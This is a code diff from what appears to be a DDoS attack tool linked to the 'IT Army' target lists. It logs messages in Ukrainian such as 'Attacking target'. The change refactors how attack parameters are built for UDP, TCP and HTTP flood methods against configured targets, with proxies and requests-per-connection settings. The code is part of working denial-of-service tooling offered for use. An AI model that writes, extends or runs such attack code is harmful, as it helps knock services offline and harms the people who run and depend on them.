@@ -9,7 +9,7 @@ from typing import Optional, Union
 from src.cli import init_argparse
 from src.concurrency import safe_run
 from src.core import (
-    logger, cl, Params, Stats,
+    logger, cl, Stats,
     LOW_RPC, IT_ARMY_CONFIG_URL, REFRESH_RATE, UVLOOP_SUPPORT,
     FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS,
 )
@@ -66,15 +66,14 @@ async def run_ddos(
             logger.error(f"{cl.RED}Не знайдено робочих проксі - зупиняємо атаку{cl.RESET}")
             exit()
 
-    # XXX: we don't need "params"
-    def prepare_params(params):
+    def prepare_params(target, method):
         thread_statistics = Stats()
-        statistics[params] = thread_statistics
+        statistics[(target, method)] = thread_statistics
         kwargs = {
-            'url': params.target.url,
-            'ip': params.target.addr,
-            'method': params.method,
-            'rpc': int(params.target.option("rpc", "0")) or rpc,
+            'url': target.url,
+            'ip': target.addr,
+            'method': method,
+            'rpc': int(target.option("rpc", "0")) or rpc,
             'event': None,
             'stats': thread_statistics,
             'proxies': proxies,
@@ -82,7 +81,7 @@ async def run_ddos(
         if not (table or debug):
             logger.info(
                 f'{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
-                % (params.target.url.host, params.target.url.port, params.method)
+                % (target.url.host, target.url.port, method)
             )
         return kwargs
 
@@ -114,17 +113,17 @@ async def run_ddos(
             assert target.is_resolved, "Unresolved target cannot be used for attack"
             # udp://, method defaults to "UDP"
             if target.is_udp:
-                kwargs_list.append((prepare_params(Params(target, target.method or 'UDP')), 0))
+                kwargs_list.append((prepare_params(target, target.method or 'UDP'), 0))
             # Method is given explicitly
             elif target.method is not None:
-                kwargs_list.append((prepare_params(Params(target, target.method)), 1))
+                kwargs_list.append((prepare_params(target, target.method), 1))
             # tcp://
             elif target.url.scheme == "tcp":
-                kwargs_list.append((prepare_params(Params(target, 'TCP')), 1))
+                kwargs_list.append((prepare_params(target, 'TCP'), 1))
             # HTTP(S), methods from --http-methods
             elif target.url.scheme in {"http", "https"}:
                 for method in http_methods:
-                    kwargs_list.append((prepare_params(Params(target, method)), 1))
+                    kwargs_list.append((prepare_params(target, method), 1))
             else:
                 logger.error(f"Unsupported scheme given: {target.url.scheme}")
 
